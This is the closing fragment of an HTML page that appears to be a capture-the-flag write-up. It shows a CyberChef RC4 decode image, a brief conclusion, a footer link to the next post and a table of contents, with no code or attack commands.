<p><img src="./images/9-cyberchef_rc4.png" alt="CyberChef Key Decode"></p>
<p>That got us the second half of the flag!</p>
<h2 id="conclusion">Conclusion</h2>
<p>This was a fun multi-step challenge that required a number of different skills to solve.  I enjoyed the challenge, and I hope you enjoyed the writeup!</p>

  
  <hr>
<div class="footer">
    
	    
	    
            <div class="next-post">
                <a href="/posts/writeups/2024/htb-uni-ctf/signaling-victorious/?ref=footer"><span style="font-weight:bold;">Next </span><br>HackTheBox Binary Badlands 2024 - Signaling...</a>
            </div>
        
    
</div>

  
</div>
            </main>
            
  
    <div class="article-toc ">
    <div class="toc-wrapper">
      <h4 id="contents"></h4>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#challenge-description">Challenge Description</a></li>
    <li><a href="#the-image">The Image</a></li>
    <li><a href="#dead-reanimation">dead-reanimation</a></li>
    <li><a href="#reanimatesh">reanimate.sh</a></li>
    <li><a href="#dead_reanimated">dead_reanimated</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
    </div>
</div>

  

        </div>
    </body>
</html>
